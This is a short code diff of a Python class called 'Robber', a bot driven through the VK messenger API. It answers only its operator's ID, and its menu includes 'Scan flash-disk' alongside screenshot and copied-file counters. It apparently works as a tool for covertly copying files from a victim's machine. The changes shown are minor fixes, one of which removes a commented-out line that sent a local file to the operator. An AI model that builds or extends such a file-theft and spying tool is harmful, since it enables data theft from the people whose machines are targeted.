@@ -23,7 +23,6 @@ class Robber(vk_api.VkApi):
 		self.screenshot_name = 'screenshot.png'
 		self.screenshot_count = 0
 		self.copied_files = 0
-		self.doc_send_error = False
 
 		self.main_menu_buttons = {
 								'Scan flash-disk' : 'primary',
@@ -75,7 +74,7 @@ class Robber(vk_api.VkApi):
 				answer = 'Incorrect file-key'
 				self.doc_send_error = True 
 		elif text == 'Turn off':
-			exit()
+			raise SystemExit
 		else:
 			answer = 'Unknow command'
 
@@ -120,8 +119,8 @@ class Robber(vk_api.VkApi):
 
 		for event in longpoll.listen():
 			if event.type == VkEventType.MESSAGE_NEW and event.to_me:
-				if event.user_id == config.my_id:
-					self.message_callback(event.user_id, event.text)
+				if str(event.user_id) == config.my_id:
+					self.message_callback(str(event.user_id), event.text)
 
 	def message_callback(self, id, text):
 
@@ -233,7 +232,6 @@ class Robber(vk_api.VkApi):
 	def start(self):
 
 		self.check_messages()
-		# self.send_message(message=open(r'C:\Users\gsw\projects\laptops\laptops.txt').read(), user_id=config.my_id)
 
 if __name__ == '__main__':
 
